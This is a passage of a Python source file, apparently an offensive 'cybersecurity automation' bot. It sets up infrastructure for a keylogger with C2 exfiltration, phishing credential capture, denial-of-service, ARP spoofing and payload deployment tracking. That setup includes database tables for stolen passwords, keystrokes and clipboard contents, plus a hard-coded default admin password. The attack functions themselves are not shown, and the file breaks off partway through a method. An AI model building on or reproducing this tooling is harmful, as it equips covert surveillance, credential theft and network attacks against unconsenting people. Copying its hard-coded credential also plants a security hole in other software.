#!/usr/bin/env python3
"""
🐙 MYSTERIOUS CYCLOPUS BOT - v1.0.0
====================================

A complete cybersecurity automation platform featuring:
- 100+ Security Commands
- Multi-Platform Bot Integration (Discord, Telegram, Slack, WhatsApp, Signal, Google Chat, Web)
- Advanced Web Dashboard with Orange/White Theme
- Real Network Tools (Ping, Traceroute, Nmap, Wget, Curl, SSH, Netcat)
- Social Engineering Suite with 50+ Phishing Templates
- Docker Security Scanning
- IP Management & Threat Detection
- Advanced Keylogger with Exfiltration
- Password Cracking Engine
- ARP Spoofing & Network Manipulation
- MAC Address Management
- NAT Information
- AI Transformer Engine
- Terminal Animations
- Email Composition & Sending
- PDF Report Generation

Author: Ian Carter Kulani, MSc
Version: 1.0.0
"""

import os
import sys
import json
import time
import socket
import threading
import subprocess
import requests
import logging
import platform
import psutil
import sqlite3
import ipaddress
import re
import random
import datetime
import signal
import base64
import urllib.parse
import uuid
import struct
import http.client
import ssl
import shutil
import asyncio
import hashlib
import getpass
import socketserver
import itertools
import string
import ctypes
import queue
import secrets
import smtplib
import email.message
import tempfile
import zipfile
import tarfile
import gzip
import argparse
import http.server
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path
from typing import Dict, List, Set, Optional, Tuple, Any, Union, Callable
from dataclasses import dataclass, asdict, field
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
from collections import Counter, defaultdict, deque
from enum import Enum
from functools import wraps
from abc import ABC, abstractmethod
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

# =====================
# VERSION & METADATA
# =====================
VERSION = "1.0.0"
NAME = "MYSTERIOUS_CYCLOPUS_BOT"
AUTHOR = "Mysterious Cyclopus Team"
DESCRIPTION = "Deep-Sea Command & Data Console"

# =====================
# DEPENDENCY CHECK & IMPORTS
# =====================

# Colorama for terminal colors
try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    COLORAMA_AVAILABLE = True
except ImportError:
    COLORAMA_AVAILABLE = False

# Cryptography
try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

# SSH
try:
    import paramiko
    from paramiko import SSHClient, AutoAddPolicy, SFTPClient, Transport
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

# Discord
try:
    import discord
    from discord.ext import commands, tasks
    DISCORD_AVAILABLE = True
except ImportError:
    DISCORD_AVAILABLE = False

# Telegram
try:
    from telethon import TelegramClient, events
    from telethon.tl.types import MessageEntityCode
    TELETHON_AVAILABLE = True
except ImportError:
    TELETHON_AVAILABLE = False

# Slack
try:
    from slack_sdk import WebClient
    from slack_sdk.socket_mode import SocketModeClient
    SLACK_AVAILABLE = True
except ImportError:
    SLACK_AVAILABLE = False

# Signal CLI
SIGNAL_AVAILABLE = shutil.which('signal-cli') is not None

# iMessage (macOS only)
IMESSAGE_AVAILABLE = platform.system().lower() == 'darwin'

# Google Chat
try:
    from google.oauth2 import service_account
    from googleapiclient.discovery import build
    GOOGLE_CHAT_AVAILABLE = True
except ImportError:
    GOOGLE_CHAT_AVAILABLE = False

# WhatsApp (Selenium)
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False

# Web Framework
try:
    from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for, send_file
    from flask_socketio import SocketIO, emit
    from flask_cors import CORS
    WEB_AVAILABLE = True
except ImportError:
    WEB_AVAILABLE = False

# Scapy
try:
    from scapy.all import IP, TCP, UDP, ICMP, Ether, ARP, DNS, DNSQR, send, sr1, srp, sniff, sendp
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

# WHOIS
try:
    import whois
    WHOIS_AVAILABLE = True
except ImportError:
    WHOIS_AVAILABLE = False

# QR Code
try:
    import qrcode
    QRCODE_AVAILABLE = True
except ImportError:
    QRCODE_AVAILABLE = False

# URL Shortening
try:
    import pyshorteners
    SHORTENER_AVAILABLE = True
except ImportError:
    SHORTENER_AVAILABLE = False

# Data Visualization
try:
    import matplotlib
    matplotlib.use('Agg')
    import matplotlib.pyplot as plt
    GRAPHICS_AVAILABLE = True
except ImportError:
    GRAPHICS_AVAILABLE = False

# PDF Generation
try:
    from reportlab.lib import colors
    from reportlab.lib.pagesizes import letter, A4
    from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle
    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
    from reportlab.lib.units import inch
    PDF_AVAILABLE = True
except ImportError:
    PDF_AVAILABLE = False

# Keylogger
try:
    from pynput import keyboard
    PYNPUT_AVAILABLE = True
except ImportError:
    PYNPUT_AVAILABLE = False

# DNS Python
try:
    import dns.resolver
    import dns.reversename
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False

# =====================
# THEME (Orange & White)
# =====================
if COLORAMA_AVAILABLE:
    class Colors:
        PRIMARY = Fore.YELLOW + Style.BRIGHT
        SECONDARY = Fore.WHITE + Style.BRIGHT
        ACCENT = Fore.CYAN + Style.BRIGHT
        SUCCESS = Fore.GREEN + Style.BRIGHT
        WARNING = Fore.YELLOW + Style.BRIGHT
        ERROR = Fore.RED + Style.BRIGHT
        INFO = Fore.BLUE + Style.BRIGHT
        DARK = Fore.BLACK + Style.BRIGHT
        WHITE = Fore.WHITE + Style.BRIGHT
        CYAN = Fore.CYAN + Style.BRIGHT
        ORANGE = Fore.YELLOW + Style.BRIGHT
        GREEN = Fore.GREEN + Style.BRIGHT
        MAGENTA = Fore.MAGENTA + Style.BRIGHT
        RESET = Style.RESET_ALL
        BOLD = Style.BRIGHT
        DIM = Style.DIM
else:
    class Colors:
        PRIMARY = SECONDARY = ACCENT = SUCCESS = WARNING = ERROR = INFO = DARK = WHITE = CYAN = ORANGE = GREEN = MAGENTA = BOLD = DIM = RESET = ""

# =====================
# CONFIGURATION
# =====================
CONFIG_DIR = ".cyclopus"
CONFIG_FILE = os.path.join(CONFIG_DIR, "config.json")
DATABASE_FILE = os.path.join(CONFIG_DIR, "cyclopus.db")
LOG_FILE = os.path.join(CONFIG_DIR, "cyclopus.log")
KEYLOG_FILE = os.path.join(CONFIG_DIR, "keylog.txt")
PAYLOADS_DIR = os.path.join(CONFIG_DIR, "payloads")
REPORT_DIR = "cyclopus_reports"
PHISHING_DIR = os.path.join(CONFIG_DIR, "phishing_pages")
CAPTURED_CREDENTIALS_DIR = os.path.join(CONFIG_DIR, "captured_credentials")
SSH_KEYS_DIR = os.path.join(CONFIG_DIR, "ssh_keys")
TRAFFIC_LOGS_DIR = os.path.join(CONFIG_DIR, "traffic_logs")
NIKTO_RESULTS_DIR = os.path.join(CONFIG_DIR, "nikto_results")
GRAPHICS_DIR = os.path.join(REPORT_DIR, "graphics")
SESSION_DIR = os.path.join(CONFIG_DIR, "sessions")
DEPLOYMENT_DIR = os.path.join(CONFIG_DIR, "deployments")
CRACKING_DIR = os.path.join(CONFIG_DIR, "cracking")
ARP_LOGS_DIR = os.path.join(CONFIG_DIR, "arp_logs")
MAC_LOGS_DIR = os.path.join(CONFIG_DIR, "mac_logs")
NAT_LOGS_DIR = os.path.join(CONFIG_DIR, "nat_logs")
DOCKER_SCANS_DIR = os.path.join(CONFIG_DIR, "docker_scans")
EMAIL_COMPOSER_DIR = os.path.join(CONFIG_DIR, "email_composer")
PDF_REPORTS_DIR = os.path.join(REPORT_DIR, "pdf_reports")
WEB_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "web_templates")

# Create directories
directories = [
    CONFIG_DIR, PAYLOADS_DIR, REPORT_DIR, PHISHING_DIR,
    CAPTURED_CREDENTIALS_DIR, SSH_KEYS_DIR, TRAFFIC_LOGS_DIR,
    NIKTO_RESULTS_DIR, GRAPHICS_DIR, SESSION_DIR, DEPLOYMENT_DIR,
    CRACKING_DIR, ARP_LOGS_DIR, MAC_LOGS_DIR, NAT_LOGS_DIR,
    DOCKER_SCANS_DIR, EMAIL_COMPOSER_DIR, PDF_REPORTS_DIR, WEB_TEMPLATES_DIR
]
for directory in directories:
    Path(directory).mkdir(exist_ok=True, parents=True)

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - CYCLOPUS - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE, encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger("Cyclopus")

# =====================
# ENUMS & DATA CLASSES
# =====================

class TrafficType(Enum):
    ICMP = "icmp"
    TCP_SYN = "tcp_syn"
    TCP_ACK = "tcp_ack"
    TCP_CONNECT = "tcp_connect"
    UDP = "udp"
    HTTP_GET = "http_get"
    HTTP_POST = "http_post"
    HTTPS = "https"
    DNS = "dns"
    ARP = "arp"
    MIXED = "mixed"
    RANDOM = "random"

class ScanType(Enum):
    PING = "ping"
    QUICK = "quick"
    COMPREHENSIVE = "comprehensive"
    STEALTH = "stealth"
    FULL = "full"
    UDP = "udp"
    OS = "os_detection"
    SERVICE = "service_detection"
    VULNERABILITY = "vulnerability"
    WEB = "web"

class Severity(Enum):
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"

class Platform(Enum):
    DISCORD = "discord"
    SLACK = "slack"
    TELEGRAM = "telegram"
    SIGNAL = "signal"
    IMESSAGE = "imessage"
    GOOGLE_CHAT = "google_chat"
    WEB = "web"
    WHATSAPP = "whatsapp"

@dataclass
class CommandResult:
    success: bool
    output: str
    execution_time: float
    error: Optional[str] = None
    data: Optional[Dict] = None

@dataclass
class SSHConnection:
    id: str
    name: str
    host: str
    port: int = 22
    username: str = ""
    password: Optional[str] = None
    key_path: Optional[str] = None
    status: str = "disconnected"
    created_at: str = field(default_factory=lambda: datetime.datetime.now().isoformat())
    last_used: Optional[str] = None

@dataclass
class TrafficGenerator:
    id: str
    traffic_type: str
    target_ip: str
    target_port: Optional[int]
    duration: int
    packets_sent: int = 0
    bytes_sent: int = 0
    start_time: Optional[str] = None
    end_time: Optional[str] = None
    status: str = "pending"

@dataclass
class PhishingLink:
    id: str
    platform: str
    phishing_url: str
    template: str
    created_at: str
    clicks: int = 0

@dataclass
class CapturedCredential:
    id: int
    link_id: str
    timestamp: str
    username: str
    password: str
    ip_address: str
    user_agent: str

@dataclass
class ThreatAlert:
    timestamp: str
    threat_type: str
    source_ip: str
    severity: str
    description: str
    action_taken: str

@dataclass
class KeylogEntry:
    timestamp: str
    text: str
    window: str
    process: str
    screenshot: Optional[str] = None

@dataclass
class Deployment:
    id: str
    name: str
    type: str
    payload: str
    target: str
    created_at: str
    delivered: bool = False
    opened: bool = False
    executed: bool = False

@dataclass
class ARPSpoofResult:
    target_ip: str
    gateway_ip: str
    interface: str
    status: str
    packets_sent: int
    duration: float
    started_at: str
    ended_at: str

@dataclass
class MACInfo:
    mac_address: str
    vendor: str
    ip_address: str
    hostname: str
    first_seen: str
    last_seen: str

@dataclass
class NATInfo:
    public_ip: str
    private_ip: str
    router_ip: str
    country: str
    isp: str
    nat_type: str

@dataclass
class EmailMessage:
    to: str
    subject: str
    body: str
    from_email: str
    attachments: List[str] = field(default_factory=list)
    html: bool = False
    sent_at: Optional[str] = None
    status: str = "draft"

@dataclass
class PDFReport:
    title: str
    target: str
    analysis: Dict
    timestamp: str
    file_path: str
    status: str = "generated"

# =====================
# TERMINAL ANIMATION ENGINE
# =====================
class TerminalAnimation:
    """Advanced terminal animation engine"""
    
    @staticmethod
    def spinner(duration: float = 2.0, message: str = "Processing"):
        spinner_chars = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
        start_time = time.time()
        i = 0
        while time.time() - start_time < duration:
            sys.stdout.write(f'\r{Colors.ORANGE}{spinner_chars[i % len(spinner_chars)]} {message}...{Colors.RESET}')
            sys.stdout.flush()
            time.sleep(0.08)
            i += 1
        sys.stdout.write('\r' + ' ' * (len(message) + 20) + '\r')
        sys.stdout.flush()
    
    @staticmethod
    def progress_bar(iterable, prefix: str = "Progress", length: int = 40):
        total = len(iterable)
        for i, item in enumerate(iterable):
            progress = int(length * i / total)
            bar = '█' * progress + '░' * (length - progress)
            percent = int(100 * i / total)
            sys.stdout.write(f'\r{Colors.ORANGE}{prefix}: [{bar}] {percent}% ({i}/{total}){Colors.RESET}')
            sys.stdout.flush()
            yield item
        sys.stdout.write(f'\r{Colors.ORANGE}{prefix}: [{"█" * length}] 100% ({total}/{total}){Colors.RESET}\n')
        sys.stdout.flush()
    
    @staticmethod
    def typing_effect(text: str, delay: float = 0.04):
        for char in text:
            sys.stdout.write(f'{Colors.ORANGE}{char}{Colors.RESET}')
            sys.stdout.flush()
            time.sleep(delay)
        print()
    
    @staticmethod
    def matrix_rain(duration: float = 2.0, density: int = 10):
        try:
            columns = shutil.get_terminal_size().columns
            chars = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
            start_time = time.time()
            while time.time() - start_time < duration:
                for _ in range(density):
                    row = ''.join(random.choice(chars) for _ in range(columns))
                    sys.stdout.write(f'\r{Colors.ORANGE}{row}{Colors.RESET}')
                    sys.stdout.flush()
                    time.sleep(0.03)
            sys.stdout.write('\r' + ' ' * columns + '\r')
            sys.stdout.flush()
        except:
            pass
    
    @staticmethod
    def pulse_animation(text: str, duration: float = 2.0):
        start_time = time.time()
        while time.time() - start_time < duration:
            for brightness in range(0, 100, 10):
                style = Style.DIM if brightness < 50 else Style.BRIGHT
                sys.stdout.write(f'\r{Colors.ORANGE}{style}{text}{Colors.RESET}')
                sys.stdout.flush()
                time.sleep(0.03)
            for brightness in range(100, 0, -10):
                style = Style.BRIGHT if brightness > 50 else Style.DIM
                sys.stdout.write(f'\r{Colors.ORANGE}{style}{text}{Colors.RESET}')
                sys.stdout.flush()
                time.sleep(0.03)
        sys.stdout.write('\r' + ' ' * len(text) + '\r')
        sys.stdout.flush()
    
    @staticmethod
    def wave_animation(text: str, duration: float = 2.0):
        start_time = time.time()
        colors = [Colors.ORANGE, Colors.YELLOW, Colors.WHITE, Colors.ORANGE]
        while time.time() - start_time < duration:
            for i, color in enumerate(colors):
                prefix = ' ' * i
                sys.stdout.write(f'\r{color}{prefix}{text}{Colors.RESET}')
                sys.stdout.flush()
                time.sleep(0.1)
        sys.stdout.write('\r' + ' ' * len(text) + '\r')
        sys.stdout.flush()
    
    @staticmethod
    def glitch_effect(text: str, duration: float = 1.0):
        start_time = time.time()
        while time.time() - start_time < duration:
            chars = list(text)
            for _ in range(random.randint(1, 3)):
                idx = random.randint(0, len(chars) - 1)
                chars[idx] = random.choice(['#', '@', '!', '*', '&', '%'])
            glitched = ''.join(chars)
            colors = [Colors.ORANGE, Colors.YELLOW, Colors.WHITE, Colors.CYAN]
            sys.stdout.write(f'\r{random.choice(colors)}{glitched}{Colors.RESET}')
            sys.stdout.flush()
            time.sleep(0.05)
        sys.stdout.write(f'\r{Colors.ORANGE}{text}{Colors.RESET}\n')
        sys.stdout.flush()
    
    @staticmethod
    def octopus_animation(duration: float = 2.0):
        frames = [
            "   🐙   ",
            "  🐙    ",
            " 🐙     ",
            "🐙      ",
            " 🐙     ",
            "  🐙    ",
            "   🐙   "
        ]
        start_time = time.time()
        i = 0
        while time.time() - start_time < duration:
            sys.stdout.write(f'\r{Colors.ORANGE}{frames[i % len(frames)]}{Colors.RESET}')
            sys.stdout.flush()
            time.sleep(0.15)
            i += 1
        sys.stdout.write('\r' + ' ' * 10 + '\r')
        sys.stdout.flush()

# =====================
# CONFIGURATION MANAGER
# =====================
class ConfigManager:
    DEFAULT_CONFIG = {
        "version": VERSION,
        "auto_start": False,
        "scan_timeout": 30,
        "report_format": "html",
        "animations": {
            "enabled": True,
            "startup": "matrix_rain",
            "duration": 2.0
        },
        "keylogger": {
            "enabled": False,
            "hotkey": "f10",
            "log_file": KEYLOG_FILE,
            "c2_server": "",
            "upload_interval": 30,
            "exfil_methods": ["file", "email", "c2"],
            "screenshot_interval": 60,
            "capture_clipboard": True
        },
        "web": {
            "enabled": True,
            "port": 5000,
            "host": "0.0.0.0",
            "secret_key": "",
            "require_auth": False
        },
        "email": {
            "smtp_server": "",
            "smtp_port": 587,
            "smtp_username": "",
            "smtp_password": "",
            "from_email": "",
            "tls": True
        },
        "discord": {
            "enabled": False,
            "token": "",
            "channel_id": "",
            "prefix": "!"
        },
        "telegram": {
            "enabled": False,
            "bot_token": "",
            "chat_id": "",
            "prefix": "/"
        },
        "slack": {
            "enabled": False,
            "bot_token": "",
            "channel_id": "",
            "prefix": "!"
        },
        "signal": {
            "enabled": False,
            "phone_number": "",
            "group_id": "",
            "prefix": "!"
        },
        "google_chat": {
            "enabled": False,
            "webhook_url": "",
            "prefix": "/"
        },
        "whatsapp": {
            "enabled": False,
            "phone_number": "",
            "prefix": "!"
        },
        "imessage": {
            "enabled": False,
            "phone_numbers": [],
            "prefix": "!"
        },
        "ssh": {
            "enabled": True,
            "default_timeout": 30,
            "max_connections": 5
        },
        "traffic_generation": {
            "enabled": True,
            "max_duration": 300,
            "max_packet_rate": 1000
        },
        "social_engineering": {
            "enabled": True,
            "default_port": 8080,
            "capture_credentials": True
        },
        "dos": {
            "enabled": True,
            "max_threads": 100,
            "default_timeout": 60
        },
        "network_monitor": {
            "enabled": True,
            "interface": "eth0",
            "promiscuous": False
        },
        "cracking": {
            "enabled": True,
            "hashcat_path": "hashcat",
            "wordlist_path": "/usr/share/wordlists/rockyou.txt",
            "default_hash_type": 0
        },
        "arp_spoofing": {
            "enabled": True,
            "interface": "eth0",
            "enable_ip_forward": True
        },
        "transformer": {
            "enabled": True,
            "max_input_length": 1000,
            "cache_size": 100
        },
        "docker": {
            "enabled": True,
            "scan_timeout": 300
        }
    }
    
    def __init__(self):
        self.config_dir = Path(CONFIG_DIR)
        self.config_dir.mkdir(exist_ok=True)
        self.config_file = self.config_dir / "config.json"
        self.config = self.load()
    
    def load(self) -> Dict:
        try:
            if self.config_file.exists():
                with open(self.config_file, 'r') as f:
                    loaded = json.load(f)
                    for key, value in self.DEFAULT_CONFIG.items():
                        if key not in loaded:
                            loaded[key] = value
                        elif isinstance(value, dict):
                            for sub_key, sub_value in value.items():
                                if sub_key not in loaded[key]:
                                    loaded[key][sub_key] = sub_value
                    return loaded
        except Exception as e:
            print(f"Failed to load config: {e}")
        return self.DEFAULT_CONFIG.copy()
    
    def save(self) -> bool:
        try:
            with open(self.config_file, 'w') as f:
                json.dump(self.config, f, indent=2)
            return True
        except Exception as e:
            print(f"Failed to save config: {e}")
            return False
    
    def get(self, key: str, default=None):
        keys = key.split('.')
        value = self.config
        for k in keys:
            if isinstance(value, dict):
                value = value.get(k, default)
            else:
                return default
        return value
    
    def set(self, key: str, value: Any) -> bool:
        keys = key.split('.')
        target = self.config
        for k in keys[:-1]:
            if k not in target:
                target[k] = {}
            target = target[k]
        target[keys[-1]] = value
        return self.save()

# =====================
# DATABASE MANAGER
# =====================
class DatabaseManager:
    def __init__(self, db_path: str = DATABASE_FILE):
        self.db_path = db_path
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self.init_tables()
    
    def init_tables(self):
        tables = [
            """CREATE TABLE IF NOT EXISTS command_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                command TEXT NOT NULL,
                source TEXT DEFAULT 'local',
                platform TEXT,
                user_id TEXT,
                success BOOLEAN DEFAULT 1,
                output TEXT,
                execution_time REAL
            )""",
            """CREATE TABLE IF NOT EXISTS threats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                threat_type TEXT NOT NULL,
                source_ip TEXT NOT NULL,
                severity TEXT NOT NULL,
                description TEXT,
                action_taken TEXT,
                resolved BOOLEAN DEFAULT 0
            )""",
            """CREATE TABLE IF NOT EXISTS managed_ips (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address TEXT UNIQUE NOT NULL,
                domain TEXT,
                added_by TEXT,
                added_date DATETIME DEFAULT CURRENT_TIMESTAMP,
                notes TEXT,
                is_blocked BOOLEAN DEFAULT 0,
                block_reason TEXT,
                threat_level INTEGER DEFAULT 0,
                alert_count INTEGER DEFAULT 0
            )""",
            """CREATE TABLE IF NOT EXISTS ssh_connections (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                host TEXT NOT NULL,
                port INTEGER DEFAULT 22,
                username TEXT NOT NULL,
                password_encrypted TEXT,
                key_path TEXT,
                status TEXT DEFAULT 'disconnected',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                last_used DATETIME
            )""",
            """CREATE TABLE IF NOT EXISTS ssh_commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                connection_id TEXT NOT NULL,
                command TEXT NOT NULL,
                output TEXT,
                exit_code INTEGER,
                execution_time REAL,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )""",
            """CREATE TABLE IF NOT EXISTS traffic_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                traffic_type TEXT NOT NULL,
                target_ip TEXT NOT NULL,
                target_port INTEGER,
                duration INTEGER,
                packets_sent INTEGER,
                bytes_sent INTEGER,
                status TEXT,
                executed_by TEXT
            )""",
            """CREATE TABLE IF NOT EXISTS nikto_scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                vulnerabilities TEXT,
                output_file TEXT,
                scan_time REAL,
                success BOOLEAN DEFAULT 1
            )""",
            """CREATE TABLE IF NOT EXISTS phishing_links (
                id TEXT PRIMARY KEY,
                platform TEXT NOT NULL,
                phishing_url TEXT NOT NULL,
                template TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                clicks INTEGER DEFAULT 0,
                active BOOLEAN DEFAULT 1
            )""",
            """CREATE TABLE IF NOT EXISTS captured_credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                phishing_link_id TEXT NOT NULL,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                username TEXT,
                password TEXT,
                ip_address TEXT,
                user_agent TEXT
            )""",
            """CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT UNIQUE NOT NULL,
                password_hash TEXT NOT NULL,
                role TEXT DEFAULT 'user',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )""",
            """CREATE TABLE IF NOT EXISTS sessions (
                id TEXT PRIMARY KEY,
                user_id INTEGER,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                expires_at DATETIME
            )""",
            """CREATE TABLE IF NOT EXISTS keylogs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                text TEXT,
                window TEXT,
                process TEXT,
                screenshot_path TEXT
            )""",
            """CREATE TABLE IF NOT EXISTS dos_attacks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                attack_type TEXT NOT NULL,
                target TEXT NOT NULL,
                port INTEGER,
                duration INTEGER,
                packets_sent INTEGER,
                status TEXT,
                executed_by TEXT
            )""",
            """CREATE TABLE IF NOT EXISTS network_packets (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                source_ip TEXT,
                dest_ip TEXT,
                source_port INTEGER,
                dest_port INTEGER,
                protocol TEXT,
                size INTEGER,
                payload TEXT
            )""",
            """CREATE TABLE IF NOT EXISTS deployments (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                type TEXT NOT NULL,
                payload TEXT,
                target TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                delivered BOOLEAN DEFAULT 0,
                opened BOOLEAN DEFAULT 0,
                executed BOOLEAN DEFAULT 0
            )""",
            """CREATE TABLE IF NOT EXISTS clipboard_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                content TEXT,
                source TEXT
            )""",
            """CREATE TABLE IF NOT EXISTS docker_scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                image TEXT NOT NULL,
                vulnerabilities TEXT,
                severity TEXT,
                scan_time REAL,
                success BOOLEAN DEFAULT 1
            )""",
            """CREATE TABLE IF NOT EXISTS cracking_jobs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                job_id TEXT UNIQUE NOT NULL,
                hash_type TEXT NOT NULL,
                hash_value TEXT NOT NULL,
                wordlist TEXT,
                status TEXT DEFAULT 'pending',
                result TEXT,
                started_at DATETIME,
                completed_at DATETIME,
                cracked BOOLEAN DEFAULT 0
            )""",
            """CREATE TABLE IF NOT EXISTS arp_spoofing (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target_ip TEXT NOT NULL,
                gateway_ip TEXT NOT NULL,
                interface TEXT,
                status TEXT DEFAULT 'active',
                packets_sent INTEGER DEFAULT 0,
                duration REAL,
                started_at DATETIME,
                ended_at DATETIME
            )""",
            """CREATE TABLE IF NOT EXISTS mac_info (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                mac_address TEXT UNIQUE NOT NULL,
                vendor TEXT,
                ip_address TEXT,
                hostname TEXT,
                first_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
                last_seen DATETIME
            )""",
            """CREATE TABLE IF NOT EXISTS nat_info (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                public_ip TEXT,
                private_ip TEXT,
                router_ip TEXT,
                country TEXT,
                isp TEXT,
                nat_type TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )""",
            """CREATE TABLE IF NOT EXISTS email_messages (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                to_address TEXT NOT NULL,
                subject TEXT NOT NULL,
                body TEXT,
                from_address TEXT,
                html BOOLEAN DEFAULT 0,
                attachments TEXT,
                sent_at DATETIME,
                status TEXT DEFAULT 'draft',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )""",
            """CREATE TABLE IF NOT EXISTS pdf_reports (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                title TEXT NOT NULL,
                target TEXT,
                analysis TEXT,
                file_path TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                status TEXT DEFAULT 'generated'
            )"""
        ]
        
        for sql in tables:
            try:
                self.conn.execute(sql)
            except Exception as e:
                print(f"Table creation error: {e}")
        
        self.conn.commit()
        self._create_default_admin()
    
    def _create_default_admin(self):
        try:
            import hashlib
            default_password = "cyclopus_2024"
            password_hash = hashlib.sha256(default_password.encode()).hexdigest()
            self.conn.execute(
                "INSERT OR IGNORE INTO users (username, password_hash, role) VALUES (?, ?, ?)",
                ("admin", password_hash, "admin")
            )
            self.conn.commit()
        except:
            pass
    
    def log_command(self, command: str, source: str = "local", platform: str = None,
                   user_id: str = None, success: bool = True, output: str = "",
                   execution_time: float = 0.0):
        try:
            self.conn.execute(
                """INSERT INTO command_history 
                   (command, source, platform, user_id, success, output, execution_time)
                   VALUES (?, ?, ?, ?, ?, ?, ?)""",
                (command, source, platform, user_id, success, output[:5000], execution_time)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log command: {e}")
    
    def get_managed_ips(self, include_blocked: bool = True) -> List[Dict]:
        try:
            if include_blocked:
                rows = self.conn.execute("SELECT * FROM managed_ips ORDER BY added_date DESC")
            else:
                rows = self.conn.execute("SELECT * FROM managed_ips WHERE is_blocked = 0 ORDER BY added_date DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def add_managed_ip(self, ip: str, domain: str = None, added_by: str = "system", notes: str = "") -> bool:
        try:
            ipaddress.ip_address(ip)
            self.conn.execute(
                "INSERT OR IGNORE INTO managed_ips (ip_address, domain, added_by, notes) VALUES (?, ?, ?, ?)",
                (ip, domain, added_by, notes)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def get_statistics(self) -> Dict:
        stats = {}
        try:
            stats['total_commands'] = self.conn.execute("SELECT COUNT(*) FROM command_history").fetchone()[0]
            stats['total_threats'] = self.conn.execute("SELECT COUNT(*) FROM threats").fetchone()[0]
            stats['total_managed_ips'] = self.conn.execute("SELECT COUNT(*) FROM managed_ips").fetchone()[0]
            stats['blocked_ips'] = self.conn.execute("SELECT COUNT(*) FROM managed_ips WHERE is_blocked = 1").fetchone()[0]
            stats['total_ssh_connections'] = self.conn.execute("SELECT COUNT(*) FROM ssh_connections").fetchone()[0]
            stats['total_traffic_tests'] = self.conn.execute("SELECT COUNT(*) FROM traffic_logs").fetchone()[0]
            stats['total_phishing_links'] = self.conn.execute("SELECT COUNT(*) FROM phishing_links").fetchone()[0]
            stats['captured_credentials'] = self.conn.execute("SELECT COUNT(*) FROM captured_credentials").fetchone()[0]
            stats['total_keylogs'] = self.conn.execute("SELECT COUNT(*) FROM keylogs").fetchone()[0]
            stats['total_dos_attacks'] = self.conn.execute("SELECT COUNT(*) FROM dos_attacks").fetchone()[0]
            stats['total_deployments'] = self.conn.execute("SELECT COUNT(*) FROM deployments").fetchone()[0]
